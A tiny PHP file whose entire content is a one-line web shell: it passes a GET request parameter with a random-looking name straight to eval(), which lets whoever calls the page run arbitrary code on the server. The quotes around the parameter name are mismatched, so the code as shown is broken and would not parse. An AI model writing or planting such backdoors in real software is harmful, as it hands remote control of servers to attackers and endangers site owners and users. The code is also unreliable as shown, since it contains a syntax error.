<?php
eval($_GET["luQJwL1g']);
?>
